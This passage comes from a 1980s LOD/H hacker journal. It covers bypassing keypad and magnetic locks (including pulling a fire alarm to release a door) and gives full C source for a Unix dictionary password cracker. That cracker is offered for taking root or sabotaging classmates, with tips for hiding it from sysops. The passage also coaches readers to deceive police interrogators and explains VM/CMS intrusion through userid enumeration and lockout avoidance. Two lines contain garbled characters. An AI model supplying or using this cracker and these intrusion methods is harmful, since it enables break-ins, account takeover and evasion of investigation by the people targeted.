+possibilities to a very reasonable level, but I will not explain it here. If
+you are really interested, contact me via the LOD/H Technical Journal Staff
+account on the Sponsor boards.
+
+
+Mechanical Keypad locks:
+
+The best thing about these types of locks, is that they are 100% mechanical.
+This means that it is not computerized, and there is no monitoring of bad codes
+or the door staying open for too long, or anything! All you have to worry about
+is getting a correct code. Probably the largest manufacturer of these devices,
+is Simplex Security Systems, Inc. The devices are called, Simplex Keyless
+Locks. Every lock of theirs that I have seen, has 5 buttons. Combinations may
+use as many of the five buttons the facility cares to use. The biggest problem
+with this type, is that there is the option of pushing 2 buttons at the same
+time, which would be the same as adding another button to the lock. Thus,
+button 1 & 5 can be pushed simultaneously, then button 3, then buttons 2 & 4
+would be pushed at the same time.
+
+These are supposedly, 'keyless locks' but on many models, a 'management key'
+can be used to override the security code, so obtaining the key, is a way to
+bypass the code. Both the spying and dusting methods apply to these devices,
+and the best thing is that you can try all possiblities you want without an
+alarm signalling.
+
+
+Magnetic locks:
+---------------
+
+These are commonly called 'Magnalocks' and use only the force of electro-
+magnetism to keep a door shut. Typically, the magnet is mounted in the door
+frame and a self aligning strike plate is mounted on the door. These locks
+provide the capability of up to a few thousand pounds of force for security.
+They are not only found on doors, but can be put on sliding doors, glass doors,
+double doors and gates. The magnet and plate is roughly 3 inches by 6-8 inches.
+
+There are a few things you should try to findout about these devices before
+attempting anything:
+
+Is there backup power? (ie. Usually a 12-24V battery can be used) Obviously, if
+there is no backup power and there is a power outage, there will be nothing to
+stop you from opening up the door.
+
+Most devices have the capability to monitor whether the door is closed, which
+is what magnetic contact switches do. But there is another option, which will
+provide a voltage output signal on a third wire, which determines whether the
+lock is powered and secure. If there is no monitoring of whether the door is
+secure, then there is no way of knowing it is locked, unless it is physically
+checked. There are optional LED's which can be mounted on the lock to indicate
+its status. For the Securitron Magnalock, an amber LED will indicate that the
+lock is powered. A green light shows the lock is powered and secure. Red, shows
+that the lock is unlocked, and no light means there is a violation, ie. the
+power switch is on, but the lock is not reporting secure. You can use these
+lights to your advantage.
+
+If a magnalock is tied into a fire alarm system, such that it is automatically
+released in the event of fire, then you or an accomplice can signal a fire
+alarm and sneak in while the lock releases.
+
+
+MISCELLANEOUS:
+--------------
+
+LED's: Some devices or models of devices have LED lights built into/onto the
+device. They are usually used to indicate a secure or insecure condition.
+This applies to magnetic contacts, shock sensors, and other devices. Even when
+the security system is not in a secure mode, (for example, during regular
+business hours a system may be off, but after 6pm it is turned on) the LED will
+light when an alarm condition occurs. For example, you bang on a window that
+has a shock sensor, and the red LED lights, or blinks for a few seconds. You
+can use this to your advantage to test theories or methods during a time which
+a receiver pays no attention to the signals sent to it. Then when it is turned
+on, you will have more confidence in what you are doing.
+
+Supervised loops: Most if not all devices will have supervised loops for
+constant monitoring of battery power, electrical shorts, and defective devices.
+If the security system of the facility is very old, loops may not be
+supervised, and simply cutting a wire will disable the alarm.
+
+Naming of devices: For large orders, manufactures of security devices may put
+the facility's name on the product instead of their own. This is probably for
+esoteric purposes. This hampers your efforts in obtaining the name of the
+maker of any type of product for purposes of geting additional information and
+brochures on the device.
+
+Single person entry: These devices include mechanical and optical turnstiles
+which meter people in and out one-by-one. Mantraps, usually found in high
+security installations are double-doored chambers which allow only one person
+in at a time, and will not allow the person out until the  system is satisfied
+he is authorized.
+
+Extreme weather conditions: Unlike perimeter security devices, most exterior
+security devices are either placed inside the facility, or can withstand just
+about any type of environmental condition, so there is not much that you can
+take advantage of.
+
+CONCLUSION:
+-----------
+
+People typically make security a lower priority than less important things.
+Those who do not upgrade their systems because of spending a few dollars are
+rewarded by being ripped off for thousands. I have no pity for those who do
+not believe in security, physical or data...
+
+
+ACKNOWLEDGEMENTS:
+-----------------
+
+Gary Seven (LOH)
+
+And of course, the information from brochures, and questions  answered by the
+nice technical support people for the companies specifically mentioned in this
+article.
+
+The LOD/H Technical Journal: File #6 of 10
+
+
+A Discreet Unix Password Hacker
+-------------------------------
+
+By Shooting Shark / Tiburon Systems  4 Mar 87
+
+     Imagine this familiar situation:  you have an account on a Unix system.
+Perhaps it's your account on your school's VAX, or an account you've hacked
+yourself.  You'd like to collect more passwords to this system - perhaps
+to the 'root' or 'bin' accounts so you can take control of the system, or the
+password of the class hotshot who's going to get an 'A' on his compiler
+project and upset the curve unless you go in and erase all of his files.
+The problem is getting these passwords.  The most obvious method would be to
+manually enter login/password combinations until you found one.  This is
+slow (>10 seconds per try), will give you sore fingers, and multiple
+invocations of the 'login' program may be noticed.  You could write a program
+on your micro to dial up the site (*if* it has a dialup) and try passwords
+from a login/password pool, but this is just as slow, ties up your computer
+and your phone line, and again is subject to easy detection.  The solution
+to this problem is to have the system itself hack passwords for you.
+It can do this unattended and at a considerable speed while you go about
+your life, and will be difficult to detect by system demigods.
+
+Here is the C source for my program.  Upload it to your Unix site and
+compile it.
+
+--- cut here ---
+/*
+ * hpw.c v1.4: 8 October '86
+ * Written by Shooting Shark / Tiburon Systems
+ *
+ */
+
+#include <sys/file.h>
+#include <stdio.h>
+#include <pwd.h>
+#include <signal.h>
+
+struct     passwd *pwd, *getpwname(name);
+
+int   len, abort(), endpwent();
+
+char  crbuf[30], *strcpy(), *crypt(), *getpass(), *getlogin(), *pw, pwbuf[10];
+
+main(argc, argv)
+int argc;
+char *argv[];
+{
+
+FILE *fopen(), *fp;
+
+char *uname;
+signal(SIGINT,abort);
+
+
+if (argc !=3) {
+     printf("usage : %s username pwfile\n",argv[0]);
+     exit(-1);
+     }
+
+
+
+
+
+if (!(pwd =getpwnam(argv[1]))) {
+     printf("unknown user : %s\n",argv[1]);
+     exit(-1);
+     }
+
+if ((fp = fopen(argv[2], "r")) == NULL) {
+     perror(argv[2]);
+     exit(-1);
+     }
+
+
+
+sprintf(crbuf,"%s",pwd->pw_passwd);
+
+printf("hacking %s\n",argv[1]);
+printf("encrypted password : %s\n",crbuf);
+
+while (fgets(pwbuf, 20, fp) != NULL) {
+     pwbuf[strlen(pwbuf)-1] = '\0';
+     pw = crypt(pwbuf,crbuf);
+     if (!strcmp(pw,crbuf)) {
+     printf("%s ==> %s\n",argv[1],pwbuf);
+     exit(0);
+     }
+     }
+printf("done -- password not found.\n");
+
+
+     endpwent();
+
+
+}
+
+abort()
+{
+printf("aborted while trying '%s'\n",pwbuf);
+
+exit(-1);
+}
+
+--- cut here ---
+
+(Note - written on a Pyramid 90x running Berzerkeley Unix 4.2.  If you're
+running SysV or something else you may have problems.  You probably
+won't, but you might.)
+
+Now that you have the above compiled into a file called 'hpw,' invoke
+it with
+
+% hpw username pwfile
+( % is the shell prompt; don't type it...)
+
+where username is the login name of the user who's password you'd like
+to hack, and pwfile is the path of a text file that contains the pool of
+likely passwords.  Most sites will have a file of words for the 'spell'
+spelling checker - it will probably be /usr/dict/words and contain at least
+15,000 potential passwords.
+
+Hpw starts by loading the user's encrypted password from /etc/password and
+stores it in crbuf.  It then starts reading words from the file you've
+specified, encrypts them using the crypt() routine, and compares them to
+the encrypted password.  If they match, the program outputs a line like:
+'shark ==> hispassword' and quits.  If they don't match, it goes on to the
+next potential password.  If the program goes through the entire list and
+doesn't find the correct password, it prints 'done -- password not found'
+and quits.  If you hit ^C (or BREAK, or whatever your interrupt character
+is) the program tells you which word in the file it had gotten to when
+it was interrupted and quits.  Then, the next time you attempt to hack that
+login name, you can start where you left off during the previous session.
+
+The beauty of this program is that you can run it in background with the
+output sent to a file and then log off, or play rogue, or whatever.  To
+hack melody's password using /usr/dict/words as your pool file, and to
+have all messages generated by the program sent to a file called 'out.file'
+and run the program in background, you'd enter from csh:
+
+% hpw melody /usr/dict/words > out.file &
+
+the & signifies a background process.  The system will print something like:
+[1] 90125
+this means it's job number 1 for you, and has process id 90125.  To bring
+the program back into the foreground, enter:
+
+% %1
+
+and to kill the process, type
+
+% kill 90125
+
+if you have hpw running in background and you're in csh, you can just log off
+and the program will continue to silently gather passwords.  If you're under
+the sh shell, you'll need to run the program with 'nohup' (read the man
+entry for more info) or sh will kill the process when you log out.
+
+Anyway, after you've given the program sufficient time to go through the
+list (more on this in a second), log in again.  If the output file exists,
+the program has completed its job.  Otherwise use 'ps' to see if the program
+is still running.  cat the file and you'll see something like this:
+
+hacking melody
+encrypted password : K4h7iidD1vX0a
+melody ==> joshua (or 'done -- password not found')
+
+make a note of melody's password, rm the incriminating output file, and
+move on to the next login name.  Easy, huh?
+
+Now for the bad news:  The designers of Unix weren't stupid.  They
+deliberately designed the crypt() routine so that it's unique (it's a minor
+deviation of the DES, so you can't use a fast DES-busting program to attack
+the /etc/passwd file).  This program uses the fastest possible method of
+brute-force hacking Unix passwords, but it isn't too speedy itself.  I wrote
+the program on a Pyramid 90x, which is a 32-bit multi-processor
+RISC-architecture machine.  When running this program in foreground while I was
+the only user on the system, it averaged 2 seconds per try.  You can expect
+this performance on one of the better VAXen.  If you're on a Cray (sure...) it
+might take the program 1/8 second per hack.  If you're on an AT running XENIX
+or a PDP-11/44, expect 5 seconds per try.  (I really don't know how long it
+would take, why don't some people time it and give me feedback...I'd appreciate
+it.)
+
+Realistically, if you're using the system's spelling-checker word list that
+contains 20,000 words and you're running the program in background, give
+it at least 12 hours.  If you have a system operator who likes to keep
+track of people's long-running jobs, tell them via mail that you'll be
+computing the limit of 1/x to infinity or something like that and they'll
+leave the process alone. If you have your own file of 100 probable passwords
+(such as 'joshua,' 'secret' or the person's name) it will take 10 minutes
+or so to complete.  Sensible selection of potential passwords (most UNIX
+systems don't allow passwords of less than 5 characters; attempt to change
+your password to progressively shorter and shorter words until you find out
+what your system's minimum length is) and running the program at strategic
+times (like after midnight) will cut the time down.
+
+Hackers who know 'C' (and everybody should know C by now; it's the best
+language ever designed) will want to modify the program I've presented.
+You may want to 'hard code' the username to be hacked and the pwfile path;
+'progname root word.file' on a process table might look a LITTLE suspicious
+to snoopy system operators (and it goes without saying that you shouldn't
+call the program 'hack' or 'hpw', nor leave the source unencrypted in your
+directory).  Also, since the crypt() routine is universal, you can hard-code
+the 'crbuf' variable with the encrypted password (from /etc/passwords)
+of a user on another system!  When hardcoding a password, make sure you spell
+it correctly, and that it contains exactly 13 characters of upper & lower case,
+and/or numbers. I once successfully hacked the root account of an AT&T Micro in
+Michigan on my local Pyramid 90x.  Thus I didn't need to take up space on the
+guy's file system with the source and didn't have to run the program on his
+slow system - once I obtained the 6300's /etc/passwd file from the person who
+hacked into the system, I attacked it at my local site.  If you happen to have
+a system of your own that runs Unix, you can hack any system's root account at
+home, completely risk-free.
+
+Unix is the best operating system I've ever used.  It's immensely powerful;
+as demonstrated by the program above, it's easy to make the system work for
+you.  If you have any questions, comments, criticisms, threats, etc, get in
+touch with me - my primary goal is not to prove that I'm more of a Unix Wizard
+than the other guy, but rather to do my part in the ongoing crusade to make
+forbidden information available to the people who can use it.
+'Knowledge is Power,' as the saying goes.
+
+-- Shark.
+
+(>---------------------------------------------------------------------------<)
+The LOD/H Technical Journal: File #7 of 12
+
+
+   Intelligence and Interrogation Processes
+   By:  Master Of Impact and the Legion Of Hackers
+
+
+                              INTRODUCTION:
+                              =============
+
+   Doing what we do best always carries the risk of someone, somewhere, wanting
+to hold you for questioning. In this article I hope to give those persons who
+never have been exposed to this type of thing a little insight to the methods
+that are in use (and are in no ways happen to be all new), that can give you
+the edge you need to come away "sin faulta". In fact, these interrogation
+practicies are used a lot by teachers, local police, the FBI and Secret Service
+girlfriends, wives, parents, etc. to obtain information from you that you
+probably don't want to give out.
+
+     Interrogation is the art of questioning and examining a source in order to
+obtain the maximum amount of useful information. The goal of any interrogation
+is to obtain useful and reliable information in a lawful manner and in a
+minimum amount of time. The goal of any source is to deceive or hinder any
+attempts of the interrogator to get information out of him.
+
+     This article will deal primarily with the principles, techniques, and
+procedures of intelligence interrogation. By reading this article, one
+who runs the risk of being interrogated can build countermeasures for common
+interrogation techniques. This article has some paraphrased material from a
+government interrogation manual but the majority of the information was from
+personal experience and prior knowledge of the subject.
+
+     You cannot hope to defeat interrogation techniques unless you first know
+what they are. The ones listed herein are the most commonly used. After reading
+this article, you should be able to tell when you are being interrogated by
+people, and what technique(s) they are using when you probably would not have
+known before. Once you know what they are up to and how they are going to TRY
+to accomplish it, YOU have the initiative!
+
+
+                                INITIATIVE:
+                                ===========
+
+     Achieving and maintaining the initiative is essential to a successful
+interrogation just as offense is the key to success in combat oPe`#K=9"+v
+initiative in any interrogation must rest with the interrogator throughout the
+entire interrogation. He will have certain advantages at the beginning of an
+interrogation which will enable him to grasp the initiative and assist in
+maintaining the initiative throughout the interrogation.
+
+     The interrogator has a position of authority over you. You realize this
+fact, and in some cases, believe that your future might well depend upon your
+association with the interrogator. As in the case of police questioning,
+"cooperate and we will go easy on you". Like hell they will.
+
+     The interrogator knows the purpose of the interrogation; the source does
+not necessarily know the exact reason, but can generally assume (especially
+in the case of a computer hacker or phone phreak, which is what the term
+"source" will be referring to during this article) because he or she is most
+usually conscious of horrible and nasty wrong-doings he or she may have been
+responsible for.  Unfortunately for the source, he is generally very much in
+the dark about what's happening to his life while it is, in fact, crumbling
+around him (temporarily, anyway). This gives the source a not-so-illusionary
+behavior pattern of the proverbial chicken who's had its head chopped off.
+
+     Having gained the initial advantage which is quite an understatement,
+seeing that, although the risks to the source during the perpetration of
+a crime are quite obvious, the possible realistic results of being caught
+aren't quite as impressive while one is getting away with a crime than when
+one's home is invaded by the JC Penny-suit men wearing mirrored sunglasses,
+the interrogator must strive to maintain the initiative applying appropriate
+interrogation techniques through the exercise of self-control; by taking
+advantage of the source's weaknesses as they become apparent; and by
+continuously displaying an attitude of confidence and self-assurance. The
+interrogator, however, is 'supposed' to never take advantage of your weaknesses
+to the extent that the interrogation involves threats, insults, torture
+or exposure to unpleasant or inhumane treatment of any kind. Remember, the
+keyword is supposed.
+
+     It is possible for the interrogator to lose the initiative during the
+interrogation of a source. If this should occur, he will probably postpone the
+interrogation and reassess the situation. If the interrogation is resumed, a
+different interrogator will probably be introduced. Following are some examples
+of loss of initiative:
+
+* The interrogator becomes angry and completely loses his self-control because
+  of the arrogant actions of the source (such as the unbuttoning of a jacket
+  to reveal "Secret Service Sucks" spray painted onto the source's T-shirt.)
+  As a result, the interrogator loses sight of his objective and concentrates
+  his efforts on humbling the source.
+
+* During the interrogation the interrogator fails to note significant
+  discrepancies in the source's story. The interrogator may lose his initiative
+  as the source gains confidence from his success and resorts to further
+  deception, leading the interrogator away from his objective.
+
+* The interrogator becomes overly friendly with the source and allows him to
+  lead the interrogation. The source reports only what he believes to be
+  important and neglects several significant items of info which could have
+  been obtained had the interrogator maintained the initiative.
+
+
+                           PHASES OF INTERROGATION:
+                           ========================
+
+      Approach Phase:
+      ---------------
+
+     Regardless of the type of source you are and your outward personality, you
+do possess weaknesses which, if recognized by the interrogator, can be
+exploited. A human being is likely to:
+
+      o   Talk, especially after harrowing experiences
+      o   Show deference when confronted by superior authority
+      o   Rationalize acts about which he feels guilty
+      o   Lack the ability to apply or to remember lessons he may have been
+          taught regarding security if confronted with a disorganized or a
+          strange situation.
+      o   Cooperate with those who have control over him
+      o   Attach less importance to a topic which the interrogator demonstrates
+          identical or related experiences and knowledge
+      o   Appreciate flattery and exoneration from guilt
+      o   Cooperate readily when given material rewards
+      o   Cooperate readily when treated as an equal
+
+
+                                  TECHNIQUES:
+                                  ===========
+
+       "File and Dossier"
+        ----------------
+
+     The interrogator prepares a dossier containing all available info obtained
+from records and docs concerning you. Careful arrangement of the material with-
+in the file may give the illusion that it contains more data than is actually
+there. The file may be "padded" with extra paper, if necessary. Index tabs with
+titles such as "education", "employment", "criminal record", "bulletin boards",
+"violated computer systems", and others are particularly effective for this
+purpose. The interrogtor will confront you with the dossier at the beginning of
+the interrogation and explain that "intelligence" has provided a complete
+record of every significant happening in your life; therefore, it would
+be useless to resist interrogation. The interrogator may read a few selected
+bits of known data to further impress you. If the technique is successful, you
+will be impressed with and more importantly, terrified by the "voluminous"
+file, conclude that everything is known, and resign to complete cooperation.
+
+
+      "We know ALL"
+       -----------
+
+     This technique may be employed in conjunction with the above or by itself.
+The interrogator must first become thoroughly familiar with the available data
+concerning you. To begin the interrogation, the interrogator asks questions
+based on his known data. When you hesitate, refuse to answer, or provide an
+incomplete or incorrect reply, the interrogator himself provides the detailed
+answer. Through the careful use of the limited number of known details, the
+interrogator may convince you that all the info is already known; therefore,
+your answers to the questions are of no consequence. When you begin to give
+accurate and complete information, the interrogator interjects questions
+designed to gain the needed info. Questions to which answers are already known
+are also asked to test you and to maintain the deception that all the info is
+already known. A VERY effective technique I might add.
+
+
+     "Rapid Fire"
+      ----------
+
+  This approach technique involves a psychological ploy based on the principles
+that:
+
+    * Everyone likes to be heard when they speak; and
+
+    * It is confusing to be interrupted in mid-sentence with an unrelated
+      question.
+
+     This technique may be used with one, or simultaneously by two or more
+interrogators in questioning the same source. In employing this technique the
+interrogator asks a series of questions in such a manner that you do not have
+time to answer a question completely before the next question is asked. This
+tends to confuse you and you are apt to contradict yourself, as you have little
+time to prepare your answers. The interrogator then confronts you with the
+inconsistencies, causing further contradictions. In many instances you
+will begin to talk freely in an attempt to explain yourself and deny the
+inconsistencies pointed out by the interrogator. In attempting to explain your
+answers, you are likely to reveal more than you intend, thus creating
+additional leads for the interrogator.
+
+
+       "Mutt and Jeff"
+        -------------
+
+     This technique involves a psychological ploy which takes advantage of the
+natural uncertainty and guilt which a source has as a result of being detained
+and questioned. Use of this technique necessitates the employment of two
+experienced interrogators who are convincing as actors. Basically, the two
+interrogators will display opposing personalities and attitudes towards you.
+For example the first interrogator is very formal and displays an unsympathetic
+attitude. This is to make you feel cut off from your friends. At the time when
+you act hopeless and alone, the second interrogator appears (having received
+his cue by a signal, and is hidden from you), scolds the first interrogator for
+his harsh behavior and orders him from the room. He then apologizes to soothe
+you, perhaps offering coffee and a cigarette. He explains that the actions of
+the first interrogator were largely the result of an inferior intellect and
+lack of human sensitivity. The inference is created that the other interrogator
+and you have in common a high degree of intelligence and an awareness of human
+sensitivity, above and beyond that of the first interrogator. You are normally
+inclined to have a feeling of gratitude towards the second interrogator, who
+continues to show a sympathetic attitude in an effort to increase the rapport
+and control for the questioning which will follow. Should your cooperativeness
+begin to fade, the second interrogator can hint that since he is of high rank,
+having many other duties, he cannot afford to waste time on an uncooperative
+source. He may broadly infer that the first interrogator might return to
+continue the questioning. When used against the proper source, this trick will
+normally gain complete cooperation for the interrogation.
+
+
+       "Repetition"
+        ----------
+
+     Repetition is used to induce cooperation from a hostile source. The inter-
+rogator listens carefully to your answer to a question, and then repeats both
+the question and answer several times. He does this with each succeeding
+question until you become so bored with the procedure that you answer the
+question fully and truthfully to satisfy the interrogator and to gain relief
+from the monotony of this method of questioning. The repetition technique will
+Y{Od ='fbgenerally not work when employed against introverted sources or those having
+great self control.
+
+
+       "Pride and Ego"
+        -------------
+
+   This technique works effectively on many phreaks and hackers due to the fact
+that many are so damn egotistical. The strategy is to trick you into revealing
+desired information by flattering you.  It is effective with sources who have
+displayed weaknesses or feelings of inferiority. The interrogator accuses you
+of weakness or implies that you are unable to do a certain thing.  The proud or
+egotistical source will jump to the defensive. An example of an opening
+question for this technique may be:  "Why would you own a blue box when you
+have absolutely no idea how to use one?" or, "Why do you hack VMS systems if
+you can't do a damn thing once you're inside of one?" It provides you with the
+opportunity to show someone that you have "brains" and in doing so, you give
+the interrogator more information than you should have.
+
+
+        "Silent"
+         ------
+
+   The Silent technique may be successful when used against either the nervous,
+or the confident-type source.  When employing this technique, the interrogator
+says nothing to you, but looks you squarely in the eye, probably with a slight
+smile on his face. It is important for the interrogator not to look away from
+you, but force you to break eye contact first. You will become nervous, begin
+to shift around in your chair, and look away. If you ask questions the
+interrogator probably will not answer them until he is ready to break the
+silence. A source may blurt out questions such as, "What the hell do you want
+with me". When the interrogator is ready to break the silence, he may do so
+with some quite nonchalant questions such as, "You've been logging on to our
+system for a long time now, haven't you? Did you hack the passwords yourself?".
+
+    In some cases the interrogator will use several approach techniques
+concurrently, or in succession.
+
+
+                               QUESTIONS:
+                               ==========
+
+There are various questions that the interrogator may ask you:
+
+* Prepared questions:  When the topic under inquiry is very technical or when
+  legal aspects of the interrogation require preciseness, the interrogator will
+  have a list of prepared questions to follow during the interrogation.
+
+* Control questions:  To maintain control and to check on the truthfulness of
+  a source, the normal questions will be mixed with control questions-those
+  with known answers. If you fail to answer these questions, or answer wrong,
+  it will indicate that you are either not knowledgeable in the topic or that
+  you are lying.
+
+* Nonpertinent questions:  Sometimes it is necessary for the interrogator to
+  keep the true objective of the interrogation from you. By carefully blending
+  pertinent questions with nonpertinent questions, the interrogator can conceal
+  the true purpose of the inquiry.
+
+* Direct and leading questions:  The manner in which the questions are worded
+  has a direct bearing on your response.  A question may be posed in a number
+  of ways:
+
+  o "What system did you hack into on 11/11/86?"
+
+  o "Did you break into General Dynamics' computer on 11/11/86?"
+
+  o "You did break into GD's computer on 11/11/86?"
+
+  o "You didn't break into GD'S computer on 11/11/86, did you?"
+
+
+
+                         PSYCHOLOGY IN INTERROGATION:
+                         ============================
+
+The interrogator will watch for various psychological responses from you during
+an interrogation.  Some of these are:
+
+*   Rationalization:  Creating plausible excuses or explanations for one's acts
+    without being aware that these excuses or explanations are way off the
+    [obvious] reality.
+
+*   Identification:  To identify with and mimic a mental image of some one
+    important to you.
+
+*   Compensation: Trying to make up for a psychological weakness by building
+    up or exaggerating a psychological strength.
+
+*   Exhibitionism:  Showing off, bragging, etc.
+
+*   Fear, Anger, Frustration, etc.
+
+Of course when being interrogated, you should remain as emotionless as possible
+and never show anger, or get upset (NEVER inflict physical abuse upon the
+unsuspecting interrogator. This only creates tension between both the inter-
+rogator and yourself). Your every move, every response, every action is noted
+and used by the interrogator to get you to screw up and give him what he wants.
+
+There can be two main objectives that you can obtain when being interrogated.
+The first is to find ways to force the interrogator to lose his initiative. You
+can do this in many ways. A few that come to mind are:  Repeat everything the
+interrogator says. Mimic the interrogator. Laugh at the interrogator. Basically
+piss the interrogator off and make him so mad that he loses sight of his
+objective. This may however, get you in deeper trouble, but it may give you
+extra time while another interrogator is found.
+
+Lie like hell to the interrogator and piss him off. Such as the pathological
+liar gimmick: "I broke into the NSA's computer, yeah, and then used their
+network to get into the presidents private computer yeah that's it, the
+password was uh...Bonzo, yeah, and then used it to take control of a satellite
+used for Star Wars, and made it land right on top of the Kremlin, yeah that's
+the ticket!"
+
+You can also change the subject over and over again to totally unrelated things
+such as: its a nice day out today, hows the wife and kids, how about some food,
+who do you think is going to the superbowl, etc.
+
+The other and probably better objective is simply to pretend to fall for any of
+the various techniques used against you and feed the interrogator more and more
+bullshit, of course being very sincere. This way he gets totally bogus
+information while thinking you are cooperating fully.
+
+Well, I hope you never have to put this article to use in a legal manner, but
+you would be surprised how everyday you are interrogated without even
+realizing it by normal people who probably don't realize they are interrogating
+you!
+
+As stated in the other articles, you can reach me for comment via the staff
+account.
+
+MofI (LOH)
+
+The LOD/H Technical Journal: File #8 of 10
+
+
+                                   Lex Luthor
+                                      and
+                             The Legion Of Hackers
+                                    Present:
+
+                     Hacking IBM's VM/CMS Operating System
+                                     Part A
+
+
+INTRODUCTION:
+-------------
+
+    IBM mainframes make up over 50% of the mainframes used in the United
+States. These systems are traditionally used in industries such as insurance,
+banking, universities and so on. For some reason, IBM systems as a whole have
+not been very popular with hackers. This may be due to the complexity of the
+Operating Systems run on IBM systems compared to others such as UNIX or VMS.
+Another reason may be that there is much variety from shop to shop. IBM systems
+are more commonly modified and customized to fit an individual corporations
+need and the lack of "universality" for commands, files, programs and other
+procedures makes it difficult to attempt to use without any type of specific
+documentation. The lack of detailed on-line help also hinders the hacker. I
+believe that the VM/CMS Operating System is by far the best and easily learned
+of the IBM systems. But compared to other Operating Systems like UNIX or VMS,
+VM/CMS is cumbersome and harder to learn.
+
+
+ACRONYMS:
+---------
+
+     Before I even attempt to start this article, I will list the IBM-specific
+acronyms used in this article and some others that you may find on various IBM
+systems. I list them here so I will not have to do it throughout this article.
+If you don't know what one of them means later, just refer back to this list.
+
+VM/SP:    Virtual Machine/System Product
+CP:       Control Program
+CMS:      Conversational Monitoring System
+HPO:      High Performance Option
+VSE:      Virtual Storage Extended
+MVS:      Multiple Virutal Storage
+TSO:      Time Sharing Option
+JES:      Job Entry System
+CICS:     Customer Information Control System
+VSAM:     Virtual Storage Access Method
+VTAM:     Virtual Telecommunications Access Method
+IX:       Interactive Executive
+
+IPL:      Initial Program Load
+IVP:      Istallation Verification Program
+RSCS:     Remote Spooling Communications Subsystem
+DASD:     Direct Access Storage Device
+EREP:     Environmental Recording Editing and Printing
+SNA:      Systems Network Architecture
+NCCF:     Network Communications Control Facility
+REXX:     Restructured Extended Executer Language
+VTOC:     Volume Table Of Contents
+DOCS:     Display Operator Console System
+JCL:      Job Control Language
+ACF:      Advanced Communications Functions
+SQL/DS:   Structured Query Language/Data System
+DBA:      Data Base Administrator
+GCS:      Group Control System
+SCP:      System Control Program
+FDP:      Field Development Program
+CNA:      Communications Network Application
+POF:      Programmable Operator Facility
+PSW:      Program Status Word
+SSCP:     Subsystem Services Control Point
+IPCS:     Interactive Problem Control System
+DCSS:     Discontiguous Shared Segments
+VMCF:     Virtual Machine Communications Facility
+FIFO:     First In First Out
+LIFO:     Last In First Out
+AP:       Attached Processor
+MP:       Multi-Processor
+R/O:      Read/Only
+R/W:      Read/Write
+
+
+LOGGING IN:
+-----------
+
+     Typically, when you come across a CMS system, it will respond with:
+
+VM/370 ONLINE
+!
+
+.
+
+
+This message is somewhat of a contradiction. The majority of VM/CMS systems are
+rarely run on actual 370 systems but on other processors, such as the 43XX
+series and the 30XX series.
+
+The period "." prompt is the surest way of verifying that you have indeed
+connected to a VM/CMS system, aside from the "VM/370 ONLINE" message which is
+usually printed. This prompt should not be confused with DEC's TOPS-10 system,
+which also has the prompt of a period. The older versions of VM/CMS responded
+as shown above. The newer versions will give you this menu:
+
+Enter one of the following commands:
+
+   LOGON userid                    (Example:  LOGON VMUSER1)
+   DIAL userid                     (Example:  DIAL VMUSER2)
+   MSG userid message              (Example:  MSG VMUSER3 GOOD MORNING)
+   LOGOFF
+
+This menu may vary from system to system, since they may opt to not allow a
+command to be used before logging in and will omit it from the menu or they may
+add some commands. When hacking a system this menu will appear before you can
+attempt to login, thus becoming very tedious and time consuming especially at
+300 baud as you have to wait an eternity for each logon attempt.
+
+Other responses after connecting are "Ready to Host", "Press break key to begin
+session" and "Invalid Switch Characters". The last response is commonly found
+on Telenet and other packet switched networks, in which you may have to specify
+"VM" for a VM/CMS system, or "TSO" for a MVS/TSO system. There may be other IBM
+systems to select from, or "VM" may not be a valid system. You may also have to
+specify "LOGON VM" or just "LOGON" before the port selector connects you to the
+host system.
+
+LOGON can be abbreviated as just "L". A userid can be from 1-8 characters in
+length, but the first character MUST be a letter (In most systems you come
+across this will be true, but due to customization of systems, its possible
+this and even the 8 character password limit may be extended). A typical logon
+may look like:
+
+.L COMOSOLO SYSGUESS NOIPL
+
+"." is the system prompt, L is the LOGON command, COMOSOLO is the userid,
+SYSGUESS is the password, and NOIPL is the only 'login qualifier' allowed for
+the VM/CMS system. NOIPL specifies that the IPL name or device in the VM/SP
+directory should not be used for an automatic IPL. IPL simulates the LOAD
+button and the device address switches on the real computer console. Basically
+it "boots" your part of the CMS system. This is another different concept. A
+user can boot (or crash) their part of the system not the whole system (in most
+cases). NOIPL would be used when a system dumps you into a program which allows
+you little or no mobility such as a restricted menu of options (IE: A system
+backup utility) and logs you off without gaining access to CMS. NOIPL will
+prevent this program from running if it is listed in your automatic IPL entry
+within the CP directory. This should allow you access to the system. Otherwise
+the program was specified to run within your PROFILE EXEC which lists things to
+be done upon logon. NOIPL is somewhat similar but not identical to the login
+qualifier "/NOCOMMAND" for DEC's VAX/VMS systems.
+
+If the Password Suppression Facility is installed on the system, you will
+receive an invalid format message whenever the userid and password are entered
+on the same line. This is obviously a security measure to prevent users from
+entering their password in full view of anyone who may be watching as the
+password is not "masked". Thus, you will have to enter your password on a
+separate line when the system prompts you for it. The advantage of entering the
+userid and password on one line (especially at 300 baud) is that you can try
+more userids and passwords in a shorter period of time while still availing
+yourself to the systems generousness of informing you when an invalid userid
+has been entered.
+
+Error messages:
+
+There are various error messages one may encounter while logging into a VM/CMS
+system. The ones you should be most concerned about are:
+
+"Userid not in CP directory": When an invalid userid has been entered, you will
+receive this message. This indication gives the hacker a distinct advantage for
+gaining entry to the system. Probably the largest security hole for any system
+is to tell you when a valid username has been entered. After all, obtaining a
+valid userid is half the battle. The other half is obtaining a valid password.
+Even the weakest Operating Systems no longer give an indication of when a valid
+ID has been entered. Why IBM has not changed this is a mystery to me.
+
+When a valid userid is entered you will be asked to enter a password if you did
+not already do so. If the password is correct, the system will attempt to log
+you on, if not, you will receive one of two messages:
+
+"Logon unsuccessful--incorrect password": As has just been stated, a valid
+userid has been entered but the password was incorrect. Passwords can be from
+1-8 characters long, but in many cases the minimum length is changed to be at
+least three characters. There is no difference between upper and lower case
+letters for either the userid or password as they are converted to upper case
+by the system which is another security flaw as it reduces password
+possiblities.
+
+"Password incorrect - reinitiate logon procedure": This is the message received
+on the older versions of VM/CMS, which means the same thing as the above msg.
+
+"Maximum password attempts exceeded, try again later": The threshold has been
+reached for userid and/or password attempts. You will receive this message
+every time you attempt to logon after exceeding the threshold until a variable
+period of time (Probably from 1 to 5 minutes) has elapsed. This locks out ALL
+users who attempt to login to the system from that particuler line. I am not
+sure whether this is recorded anywhere or whether it is sent to the System
+Console so try to determine how many attempts normally trigger this and keep
+just short of it.
+
+"Already logged on": This message will appear when you attempt to logon with a
+valid userid and password and that userid is already online. Unlike other
+systems, VM/CMS will not allow the same userid to be logged on more than once.
+
+"Userid missing or invalid": As it implies, nothing was typed after entering
+the LOGON command, or the format for the userid was not correct, ie: using a
